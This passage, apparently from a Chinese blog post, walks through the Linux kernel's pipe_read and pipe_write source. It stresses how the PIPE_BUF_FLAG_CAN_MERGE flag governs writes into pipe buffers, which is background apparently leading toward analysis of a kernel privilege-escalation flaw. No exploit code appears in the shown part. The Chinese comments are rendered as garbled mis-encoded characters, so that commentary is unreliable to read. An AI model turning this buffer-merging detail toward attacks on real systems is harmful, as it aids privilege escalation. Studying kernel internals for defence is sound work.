class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *to)</span><br>&#123;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(to);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">bool</span> was_full, wake_next_reader = <span class="hljs-literal">false</span>;<span class="hljs-comment">//ç”¨äºè®°å½•ç®¡é“æ˜¯å¦æ»¡äº†ä»¥åŠæ˜¯å¦éœ€è¦å”¤é†’ä¸‹ä¸€ä¸ªè¯»å–è€…ã€‚</span><br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-comment">/* Null read succeeds. */</span><br>    <span class="hljs-comment">//å¦‚æœ total_len ä¸ºé›¶ï¼Œè¡¨ç¤ºè¯·æ±‚çš„è¯»å–é•¿åº¦ä¸ºé›¶ï¼Œç›´æ¥è¿”å›é›¶ï¼Œè¡¨ç¤ºè¯»å–æˆåŠŸ</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//ä½¿ç”¨ __pipe_lock å‡½æ•°é”å®šç®¡é“ï¼Œä»¥ç¡®ä¿åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¯¹ç®¡é“çš„å®‰å…¨è®¿é—®</span><br>__pipe_lock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We only wake up writers if the pipe was full when we started</span><br><span class="hljs-comment"> * reading in order to avoid unnecessary wakeups.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * But when we do wake up writers, we do so using a sync wakeup</span><br><span class="hljs-comment"> * (WF_SYNC), because we want them to get going and generate more</span><br><span class="hljs-comment"> * data for us.</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//å¦‚æœç®¡é“çš„å¤´éƒ¨æŒ‡é’ˆç­‰äºå°¾éƒ¨æŒ‡é’ˆåŠ ä¸Šæœ€å¤§ä½¿ç”¨é‡ï¼Œåˆ™è¡¨ç¤ºç®¡é“å·²æ»¡</span><br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>    <span class="hljs-comment">//æ— é™å¾ªç¯ä¸­ï¼Œå°è¯•ä»ç®¡é“ä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°è¯»å–å®Œæˆæˆ–å‡ºç°é”™è¯¯</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">/*head è¡¨ç¤ºç®¡é“ä¸­ä¸‹ä¸€ä¸ªè¦è¯»å–çš„æ•°æ®ä½ç½®ã€‚</span><br><span class="hljs-comment">tail è¡¨ç¤ºç®¡é“ä¸­ä¸‹ä¸€ä¸ªè¦å†™å…¥æ•°æ®çš„ä½ç½®ã€‚</span><br><span class="hljs-comment">mask æ˜¯ä¸€ä¸ªæ©ç ï¼Œç”¨äºè®¡ç®—ç´¢å¼•ï¼Œç¡®ä¿ç´¢å¼•ä¸ä¼šè¶…å‡ºç¼“å†²åŒºçš„èŒƒå›´ã€‚*/</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head = pipe-&gt;head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>        <span class="hljs-comment">//å¦‚æœç®¡é“çš„ note_loss æ ‡å¿—ä¸ºçœŸï¼Œå¹¶ä¸”å¾…è¯»å–æ•°æ®é•¿åº¦å°äº 8ï¼Œè¯´æ˜ç¼“å†²åŒºç©ºé—´ä¸è¶³ï¼Œè¿”å›é”™è¯¯ç  -ENOBUFSã€‚</span><br><span class="hljs-keyword">if</span> (pipe-&gt;note_loss) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification</span> <span class="hljs-title">n</span>;</span><br><br><span class="hljs-keyword">if</span> (total_len &lt; <span class="hljs-number">8</span>) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>n.type = WATCH_TYPE_META;<br>n.subtype = WATCH_META_LOSS_NOTIFICATION;<br>n.info = watch_sizeof(n);<br><span class="hljs-keyword">if</span> (copy_to_iter(&amp;n, <span class="hljs-keyword">sizeof</span>(n), to) != <span class="hljs-keyword">sizeof</span>(n)) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += <span class="hljs-keyword">sizeof</span>(n);<br>total_len -= <span class="hljs-keyword">sizeof</span>(n);<br>pipe-&gt;note_loss = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//å¦‚æœç®¡é“éç©ºï¼Œå°è¯•ä»ç®¡é“ä¸­è¯»å–æ•°æ®</span><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail)) &#123;<br>            <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];<span class="hljs-comment">//è·å–å½“å‰å°¾éƒ¨æŒ‡é’ˆ tail å¯¹åº”çš„ç®¡é“ç¼“å†²åŒº buf                                     </span><br><span class="hljs-type">size_t</span> chars = buf-&gt;len;<span class="hljs-comment">//è®¡ç®—å½“å‰ç¼“å†²åŒºä¸­å¯è¯»å–çš„æ•°æ®é•¿åº¦ chars</span><br><span class="hljs-type">size_t</span> written;<br><span class="hljs-type">int</span> error;<br><span class="hljs-comment">//å¦‚æœç¼“å†²åŒºä¸­çš„æ•°æ®é•¿åº¦å¤§äºå¾…è¯»å–æ•°æ®é•¿åº¦ total_lenï¼Œåˆ™å°†å¾…è¯»å–æ•°æ®é•¿åº¦æ›´æ–°ä¸º total_len</span><br><span class="hljs-keyword">if</span> (chars &gt; total_len) &#123;<br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>chars = total_len;<br>&#125;<br><span class="hljs-comment">//ç¡®è®¤ç®¡é“ç¼“å†²åŒº</span><br>error = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (error) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = error;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//ä»ç¼“å†²åŒºä¸­è¯»å–æ•°æ®åˆ°ç›®æ ‡ç¼“å†²åŒº to</span><br>written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);<br><span class="hljs-keyword">if</span> (unlikely(written &lt; chars)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>            <span class="hljs-comment">//æ›´æ–°è¿”å›å€¼ retã€ç®¡é“ç¼“å†²åŒºä¸­çš„åç§»é‡å’Œé•¿åº¦ï¼Œå¹¶æ¸…ç†ç©ºçš„æ•°æ®åŒ…ç¼“å†²åŒº</span><br>ret += chars;<br>buf-&gt;offset += chars;<br>buf-&gt;len -= chars;<br><br><span class="hljs-comment">/* Was it a packet buffer? Clean up and exit */</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;<br>total_len = chars;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//å¦‚æœç¼“å†²åŒºå·²ç©ºï¼Œåˆ™é‡Šæ”¾ç¼“å†²åŒºï¼Œå¹¶æ›´æ–°å°¾éƒ¨æŒ‡é’ˆ tail</span><br><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<br>pipe_buf_release(pipe, buf);<br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)<br>pipe-&gt;note_loss = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>tail++;<br>pipe-&gt;tail = tail;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br>            <span class="hljs-comment">//æ›´æ–°å¾…è¯»å–æ•°æ®é•¿åº¦ total_len</span><br>total_len -= chars;<br>            <span class="hljs-comment">//å¦‚æœè¯»å–å®Œæˆï¼Œåˆ™è·³å‡ºå¾ªç¯ï¼›å¦åˆ™ç»§ç»­å°è¯•è¯»å–æ›´å¤šæ•°æ®</span><br><span class="hljs-keyword">if</span> (!total_len)<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">/* common path: read succeeded */</span><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail))<span class="hljs-comment">/* More to do? */</span><br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-comment">//å¦‚æœç®¡é“ä¸­æ²¡æœ‰å†™å…¥è€…ï¼Œè·³å‡ºå¾ªç¯</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;writers)<br><span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//å¦‚æœå‡ºç°é”™è¯¯æˆ–å·²ç»è¯»å–åˆ°æ•°æ®ï¼Œåˆ™è·³å‡ºå¾ªç¯</span><br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//å¦‚æœæ–‡ä»¶æ ‡å¿—ä¸ºéé˜»å¡ï¼Œå¹¶ä¸”ç®¡é“ä¸ºç©ºï¼Œåˆ™è¿”å›é”™è¯¯ç  -EAGAIN</span><br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We only get here if we didn&#x27;t actually read anything.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * However, we could have seen (and removed) a zero-sized</span><br><span class="hljs-comment"> * pipe buffer, and might have made space in the buffers</span><br><span class="hljs-comment"> * that way.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * You can&#x27;t make zero-sized pipe buffers by doing an empty</span><br><span class="hljs-comment"> * write (not even in packet mode), but they can happen if</span><br><span class="hljs-comment"> * the writer gets an EFAULT when trying to fill a buffer</span><br><span class="hljs-comment"> * that already got allocated and inserted in the buffer</span><br><span class="hljs-comment"> * array.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * So we still need to wake up any pending writers in the</span><br><span class="hljs-comment"> * _very_ unlikely case that the pipe was full, but we got</span><br><span class="hljs-comment"> * no data.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        åœ¨é‡Šæ”¾é”çš„æƒ…å†µä¸‹å¤„ç†æœªè¯»å–ä»»ä½•æ•°æ®çš„æƒ…å†µï¼š</span><br><span class="hljs-comment">å¦‚æœä¹‹å‰ç®¡é“å·²æ»¡ä½†æœªè¯»å–ä»»ä½•æ•°æ®ï¼Œåˆ™å”¤é†’ç­‰å¾…çš„å†™å…¥è€…å¹¶å‘é€å¼‚æ­¥é€šçŸ¥ã€‚</span><br><span class="hljs-comment">å¦‚æœå› ä¸­æ–­è€Œé€€å‡ºï¼Œåˆ™è¿”å›é”™è¯¯ç  -ERESTARTSYS</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (unlikely(was_full)) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * But because we didn&#x27;t read anything, at this point we can</span><br><span class="hljs-comment"> * just return directly with -ERESTARTSYS if we&#x27;re interrupted,</span><br><span class="hljs-comment"> * since we&#x27;ve done any required wakeups and there&#x27;s no need</span><br><span class="hljs-comment"> * to mark anything accessed. And we&#x27;ve dropped the lock.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -ERESTARTSYS;<br><br>__pipe_lock(pipe);<br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>wake_next_reader = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))<br>wake_next_reader = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">if</span> (was_full) &#123;<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>&#125;<br><span class="hljs-keyword">if</span> (wake_next_reader)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>file_accessed(filp);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h3><p>å‘<code>pipe</code>ä¸­å†™å…¥ï¼Œä¼šè°ƒç”¨åˆ°<code>pipe_write</code></p><p>é¦–å…ˆï¼Œå¦‚æœä¸Šä¸€ä¸ª<code>buffer</code>ä¸­æœ‰å‰©ä½™ç©ºé—´ï¼Œå¹¶ä¸”æ­¤<code>buffer</code>çš„<code>flag</code>æ˜¯<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ï¼Œä¼šå…ˆå°†æ­¤<code>buffer</code>å†™æ»¡</p><p>è‹¥è¿˜æœ‰å¤šçš„æ•°æ®ï¼Œä¼šç”³è¯·æ–°çš„<code>buffer</code>ï¼Œå°†<code>flag</code>è®¾ç½®ä¸º<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ï¼Œç»§ç»­å†™å…¥</p><p>ç”±æ­¤å¯è§ï¼Œ<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>å†³å®šäº†<code>buffer</code>æœ‰æ— å†™å…¥æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br><span class="hljs-type">ssize_t</span> chars;<br><span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br><span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/* Null write succeeds. */</span><br>    <span class="hljs-comment">//å¦‚æœå¾…å†™å…¥æ•°æ®é•¿åº¦ä¸ºé›¶ï¼Œåˆ™ç›´æ¥è¿”å›æˆåŠŸ</span><br><span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//é”å®šç®¡é“ä»¥ç¡®ä¿å¹¶å‘å†™å…¥æ—¶çš„æ•°æ®ä¸€è‡´æ€§</span><br>__pipe_lock(pipe);<br><span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æœ‰è¯»å–è€…ï¼Œå¦‚æœæ²¡æœ‰è¯»å–è€…ï¼Œåˆ™å‘é€ SIGPIPE ä¿¡å·å¹¶è¿”å›é”™è¯¯ç  -EPIPE</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>ret = -EPIPE;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>    <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦å¯ç”¨äº†ç›‘è§†é˜Ÿåˆ—ï¼Œå¦‚æœå¯ç”¨äº†ï¼Œåˆ™è¿”å›é”™è¯¯ç  -EXDEV</span><br><span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>ret = -EXDEV;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Only wake up if the pipe started out empty, since</span><br><span class="hljs-comment"> * otherwise there should be no readers waiting.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If it wasn&#x27;t empty we try to merge new data into</span><br><span class="hljs-comment"> * the last buffer.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * That naturally merges small writes, but it also</span><br><span class="hljs-comment"> * page-aligs the rest of the writes for large writes</span><br><span class="hljs-comment"> * spanning multiple pages.</span><br><span class="hljs-comment"> */</span><br>head = pipe-&gt;head;<br>was_empty = pipe_empty(head, pipe-&gt;tail);<span class="hljs-comment">//åˆ¤æ–­ç®¡é“æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºï¼Œåˆ™æ ‡è®° was_empty ä¸ºçœŸ</span><br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="hljs-comment">//å¦‚æœæ–°æ•°æ®é•¿åº¦ä¸ä¸ºé›¶ä¸”ç®¡é“ä¸ä¸ºç©ºï¼Œåˆ™å°è¯•å°†æ–°æ•°æ®ä¸ä¸Šä¸€ä¸ªç¼“å†²åŒºåˆå¹¶</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br><span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><span class="hljs-comment">//å¦‚æœflagä¸­æœ‰PIPE_BUF_FLAG_CAN_MERGEï¼Œä¾¿æŠŠæ•°æ®å†™å…¥ä¸Šä¸€ä¸ªbufferçš„å‰©ä½™ç©ºé—´ä¸­</span><br><span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>    offset + chars &lt;= PAGE_SIZE) &#123;<br>ret = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<span class="hljs-comment">//æ‹·è´è¿›å»</span><br><span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>ret = -EFAULT;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>buf-&gt;len += ret;<br><span class="hljs-keyword">if</span> (!iov_iter_count(from))<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><span class="hljs-comment">//è¿›å…¥ä¸€ä¸ªæ— é™å¾ªç¯ï¼Œç›´åˆ°æˆåŠŸå†™å…¥æ•°æ®æˆ–é‡åˆ°é”™è¯¯</span><br><span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æœ‰è¯»å–è€…ï¼Œå¦‚æœæ²¡æœ‰è¯»å–è€…ï¼Œåˆ™å‘é€ SIGPIPE ä¿¡å·å¹¶è¿”å›é”™è¯¯ç  -EPIPE</span><br><span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EPIPE;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//æ£€æŸ¥ç®¡é“æ˜¯å¦æœªæ»¡ï¼Œå¦‚æœæœªæ»¡ï¼Œåˆ™åˆ†é…ä¸€ä¸ªæ–°çš„ç¼“å†²åŒºç”¨äºå†™å…¥æ•°æ®</span><br>head = pipe-&gt;head;<br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><span class="hljs-type">int</span> copied;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br><span class="hljs-comment">/* Allocate a slot in the ring in advance and attach an</span><br><span class="hljs-comment"> * empty buffer.  If we fault or otherwise fail to use</span><br><span class="hljs-comment"> * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment"> * be there for the next write.</span><br><span class="hljs-comment"> 